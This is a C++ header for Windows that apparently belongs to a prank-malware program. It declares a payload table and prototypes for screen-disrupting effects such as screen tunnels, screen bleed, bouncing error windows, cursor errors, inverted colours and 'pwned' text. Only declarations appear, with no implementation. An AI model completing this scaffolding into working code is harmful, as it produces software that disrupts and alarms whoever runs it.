#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <psapi.h>
#include <commctrl.h>
#include <chrono>
#include <thread>
#include <iostream>
#include <vector>

#define PAYLOADHOST(name) DWORD (WINAPI name)(LPVOID parameter)

typedef struct {
	//PAYLOADHOST(*payloadHost);
	const char *name;
	const char *desc;
	void *payloadFuncion;
	int delaytime, delay;
} PAYLOAD;

#define Payload(Name, Description, Function) {Name, Description, Function}

#define PAYLOADFUNCTION(name) int name (HWND hwnd, HDC hdc, int width, int height, float fElapsedTime)

PAYLOADFUNCTION(basicTunnel);
PAYLOADFUNCTION(fastTunnel);
PAYLOADFUNCTION(screenBleed);
PAYLOADFUNCTION(swigglyScreenBleed);
PAYLOADFUNCTION(cursorIcons);
PAYLOADFUNCTION(bouncingError);
PAYLOADFUNCTION(randomIcons);
PAYLOADFUNCTION(cursorErrors);
PAYLOADFUNCTION(pwnedText);
PAYLOADFUNCTION(randomPwnedText);
PAYLOADFUNCTION(fastRandomIcons);
PAYLOADFUNCTION(inverseColors);

extern PAYLOAD payloads[];
extern const size_t nPayloads;